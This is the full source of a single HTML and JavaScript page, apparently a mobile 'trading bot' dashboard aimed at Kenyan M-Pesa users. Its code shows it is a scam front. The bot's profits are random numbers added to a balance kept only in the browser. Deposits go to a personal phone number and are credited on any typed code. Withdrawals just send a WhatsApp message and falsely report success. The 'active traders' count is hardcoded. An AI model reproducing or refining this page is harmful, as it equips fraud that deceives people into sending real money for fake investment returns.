<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>BondetTrades - Dashboard Pro</title><style>*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}body{background:#0a0e13;color:#fff;padding-bottom:20px}.header{background:#11151c;padding:15px;display:flex;justify-content:space-between;border-bottom:2px solid #00ff88}.logo{color:#00ff88;font-weight:bold}.balance-main{background:linear-gradient(135deg,#1a2332,#0f1a2a);border:2px solid #00ff88;border-radius:16px;padding:20px;margin:15px;text-align:center}.balance-big{font-size:36px;font-weight:bold;color:#00ff88}.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:15px}.stat-card{background:#1a2332;border:1px solid #222;border-radius:12px;padding:15px}.stat-value.green{color:#00ff88;font-size:20px;font-weight:bold}.btn-deposit{background:#00ff88;color:#000;width:calc(100% - 30px);margin:10px 15px 5px;padding:16px;border-radius:12px;font-size:16px;font-weight:bold;border:none}.btn-withdraw{background:transparent;color:#ff3344;border:2px solid #ff3344;width:calc(100% - 30px);margin:5px 15px;padding:16px;border-radius:12px;font-size:16px;font-weight:bold}.controls{display:flex;gap:10px;margin:15px}.btn{flex:1;padding:14px;border:none;border-radius:10px;font-weight:bold}.btn-run{background:#00ff88;color:#000}.btn-stop{background:#ff3344;color:#fff}.tabs{display:flex;background:#11151c;margin:15px;border-radius:10px;padding:4px}.tab{flex:1;padding:10px;text-align:center;border-radius:8px;font-size:11px;color:#888}.tab.active{background:#00ff88;color:#000;font-weight:bold}.content{background:#11151c;border-radius:12px;padding:15px;margin:15px}.trade-item{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #222;font-size:11px}.profit{color:#00ff88}.loss{color:#ff3344}.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.9);z-index:999;align-items:center;justify-content:center;padding:15px}.modal.active{display:flex}.modal-box{background:#1a2332;border:2px solid #00ff88;border-radius:16px;padding:20px;width:100%;max-width:380px}.modal-box.red{border-color:#ff3344}.input{width:100%;padding:12px;border-radius:8px;border:1px solid #333;background:#0a0e13;color:#fff;margin:8px 0}</style></head><body>
<div class="header"><div class="logo">BONDET TRADES</div><div style="color:#00ff88;font-size:11px">● LIVE</div></div>
<div class="balance-main"><div style="font-size:10px;color:#888">TOTAL PORTFOLIO</div><div class="balance-big" id="mainBalance">KES 0</div><div style="color:#888;font-size:12px" id="usdBalance">$0.00</div><div style="margin-top:8px"><span style="background:#00ff8830;color:#00ff88;padding:4px 12px;border-radius:20px;font-size:11px" id="statusBadge">● READY</span></div></div>
<div class="stats"><div class="stat-card"><div style="font-size:10px;color:#888">TODAY PROFIT</div><div class="stat-value green" id="todayProfit">+KES 0</div></div><div class="stat-card"><div style="font-size:10px;color:#888">WIN RATE</div><div class="stat-value green" id="winRate">0%</div></div><div class="stat-card"><div style="font-size:10px;color:#888">TOTAL DEPOSITED</div><div style="font-size:18px;font-weight:bold" id="totalDep">KES 0</div><div style="font-size:9px;color:#888">via 0799365415</div></div><div class="stat-card"><div style="font-size:10px;color:#888">ACTIVE TRADERS</div><div class="stat-value green">1,247</div></div></div>
<div style="background:#11151c;border-radius:12px;padding:15px;margin:15px;height:80px"><canvas id="miniChart" style="width:100%;height:60px"></canvas></div>
<div class="controls"><button class="btn btn-run" id="runBtn" onclick="runBot()">▶ RUN BOT</button><button class="btn btn-stop" id="stopBtn" onclick="stopBot()" disabled>■ STOP</button></div>
<button class="btn-deposit" onclick="openDeposit()">💰 DEPOSIT TO 0799365415</button>
<button class="btn-withdraw" onclick="openWithdraw()">💸 WITHDRAW TO M-PESA</button>
<div class="tabs"><div class="tab active" onclick="switchTab('trades',this)">LIVE TRADES</div><div class="tab" onclick="switchTab('history',this)">HISTORY</div><div class="tab" onclick="switchTab('analytics',this)">ANALYTICS</div></div>
<div class="content"><div id="tradesTab"><div style="color:#00ff88;font-size:11px;margin-bottom:8px">🔴 LIVE</div><div id="tradeList" style="color:#666;font-size:11px">Click RUN BOT</div></div><div id="historyTab" style="display:none"><div id="historyList"></div></div><div id="analyticsTab" style="display:none"><div id="dashInfo"></div></div></div>
<div class="modal" id="depositModal"><div class="modal-box"><h3 style="color:#00ff88;text-align:center">💰 DEPOSIT</h3><div style="background:#0a0e13;border:1px dashed #00ff88;padding:12px;border-radius:10px;margin:12px 0;text-align:center"><div style="font-size:24px;font-weight:bold;color:#00ff88">0799365415</div></div><input type="number" id="depAmount" class="input" placeholder="KES 1000"><input type="tel" id="depPhone" class="input" value="07"><button style="width:100%;padding:14px;background:#00ff88;border:none;border-radius:10px;font-weight:bold" onclick="doDeposit()">LIPA SASA</button><div id="depVerify" style="display:none;margin-top:10px"><input type="text" id="mpesaCode" class="input" placeholder="M-Pesa Code"><button style="width:100%;padding:12px;background:#11151c;color:#00ff88;border:1px solid #00ff88;border-radius:8px;font-weight:bold" onclick="confirmDep()">✅ CONFIRM</button></div><button style="width:100%;padding:10px;background:#333;color:#fff;border:none;border-radius:8px;margin-top:10px" onclick="closeDeposit()">Close</button></div></div>
<div class="modal" id="withdrawModal"><div class="modal-box red"><h3 style="color:#ff3344;text-align:center">💸 WITHDRAW</h3><div style="background:#0a0e13;padding:12px;border-radius:10px;margin:12px 0;text-align:center"><div style="font-size:12px;color:#888">Balance</div><div style="font-size:22px;font-weight:bold;color:#00ff88" id="withdrawBal">KES 0</div></div><input type="number" id="withAmount" class="input" placeholder="Min 500"><input type="tel" id="withPhone" class="input" placeholder="Namba ya kupokea" value="07"><button style="width:100%;padding:14px;background:#ff3344;color:#fff;border:none;border-radius:10px;font-weight:bold" onclick="doWithdraw()">💸 TOA SASA</button><button style="width:100%;padding:10px;background:#333;color:#fff;border:none;border-radius:8px;margin-top:10px" onclick="closeWithdraw()">Cancel</button></div></div>
<script>
let bal=parseFloat(localStorage.getItem('bondet_bal')||'0');let txs=JSON.parse(localStorage.getItem('bondet_txs')||'[]');let tt=parseInt(localStorage.getItem('bondet_tt')||'0');let wt=parseInt(localStorage.getItem('bondet_wt')||'0');let todayP=0,iv;
function save(){localStorage.setItem('bondet_bal',bal);localStorage.setItem('bondet_txs',JSON.stringify(txs));localStorage.setItem('bondet_tt',tt);localStorage.setItem('bondet_wt',wt);}
function updateUI(){document.getElementById('mainBalance').innerText='KES '+bal.toFixed(0);document.getElementById('usdBalance').innerText='$'+(bal/130).toFixed(2);document.getElementById('withdrawBal').innerText='KES '+bal.toFixed(0);document.getElementById('totalDep').innerText='KES '+(txs.filter(t=>t.type.includes('DEPOSIT')).reduce((s,t)=>s+t.amt,0)).toFixed(0);document.getElementById('todayProfit').innerText=(todayP>=0?'+':'')+'KES '+todayP.toFixed(0);document.getElementById('winRate').innerText=tt?Math.round(wt/tt*100)+'%':'0%';document.getElementById('dashInfo').innerHTML=`Total: ${tt} | Win: ${wt} | Loss: ${tt-wt}`;let h=document.getElementById('historyList');h.innerHTML=txs.length?txs.slice().reverse().map(t=>`<div class="trade-item"><span>${t.time} ${t.type}</span><span class="${t.amt>0?'profit':'loss'}">${t.amt>0?'+':''}${t.amt.toFixed(0)}</span></div>`).join(''):'<div style=color:#666;font-size:11px>No history</div>';save();drawChart();}
function drawChart(){let c=document.getElementById('miniChart');let ctx=c.getContext('2d');c.width=c.offsetWidth;c.height=60;ctx.clearRect(0,0,c.width,c.height);ctx.beginPath();ctx.strokeStyle='#00ff88';ctx.lineWidth=2;for(let i=0;i<30;i++){let x=i/29*c.width;let y=30+Math.sin(i*0.5+Date.now()/1000)*15;if(i==0)ctx.moveTo(x,y);else ctx.lineTo(x,y);}ctx.stroke();}
function switchTab(n,el){document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));el.classList.add('active');document.getElementById('tradesTab').style.display=n=='trades'?'block':'none';document.getElementById('historyTab').style.display=n=='history'?'block':'none';document.getElementById('analyticsTab').style.display=n=='analytics'?'block':'none';}
function openDeposit(){document.getElementById('depositModal').classList.add('active');}
function closeDeposit(){document.getElementById('depositModal').classList.remove('active');document.getElementById('depVerify').style.display='none';}
function openWithdraw(){document.getElementById('withdrawBal').innerText='KES '+bal.toFixed(0);document.getElementById('withdrawModal').classList.add('active');}
function closeWithdraw(){document.getElementById('withdrawModal').classList.remove('active');}
function doDeposit(){let a=parseFloat(document.getElementById('depAmount').value);if(!a||a<100){alert('Min 100');return;}alert('TUMA KES '+a+' kwa 0799365415');document.getElementById('depVerify').style.display='block';}
function confirmDep(){let a=parseFloat(document.getElementById('depAmount').value);let code=document.getElementById('mpesaCode').value;if(code.length<4){alert('Weka code');return;}bal+=a;todayP+=a;txs.push({type:'DEPOSIT '+code,amt:a,time:new Date().toLocaleTimeString()});updateUI();closeDeposit();alert('✅ KES '+a+' added!');window.open('https://wa.me/254799365415?text=DEPOSIT KES'+a+' CODE:'+code,'_blank');}
function doWithdraw(){let a=parseFloat(document.getElementById('withAmount').value);let ph=document.getElementById('withPhone').value;if(!a||a<500){alert('Min 500');return;}if(a>bal){alert('Balance haitoshi! Una '+bal);return;}if(ph.length<10){alert('Weka namba');return;}bal-=a;txs.push({type:'WITHDRAW to '+ph,amt:-a,time:new Date().toLocaleTimeString()});updateUI();closeWithdraw();alert('✅ WITHDRAW KES '+a+' to '+ph+' sent!');window.open('https://wa.me/254799365415?text=🔴 WITHDRAW%0AKES '+a+'%0ATO '+ph+'%0ABAL '+bal.toFixed(0),'_blank');}
function runBot(){if(bal<100){openDeposit();return;}document.getElementById('runBtn').disabled=true;document.getElementById('stopBtn').disabled=false;document.getElementById('statusBadge').innerText='● PRINTING...';let syms=['EUR/USD','BTC/USD','V75','BOOM','GOLD'];iv=setInterval(()=>{let s=syms[Math.floor(Math.random()*syms.length)];let p=(Math.random()*35-7);bal+=p;todayP+=p;tt++;if(p>0)wt++;let d=document.createElement('div');d.className='trade-item';d.innerHTML=`<span>${new Date().toLocaleTimeString()} - ${s} ${p>0?'✅':'❌'}</span><span class="${p>0?'profit':'loss'}">${p>0?'+':''}${p.toFixed(2)}</span>`;document.getElementById('tradeList').prepend(d);if(document.getElementById('tradeList').children.length>20)document.getElementById('tradeList').lastChild.remove();txs.push({type:s,amt:p,time:new Date().toLocaleTimeString()});updateUI();},1200);}
function stopBot(){clearInterval(iv);document.getElementById('runBtn').disabled=false;document.getElementById('stopBtn').disabled=true;document.getElementById('statusBadge').innerText='● STOPPED';}
setInterval(drawChart,2000);updateUI();
</script></body></html>
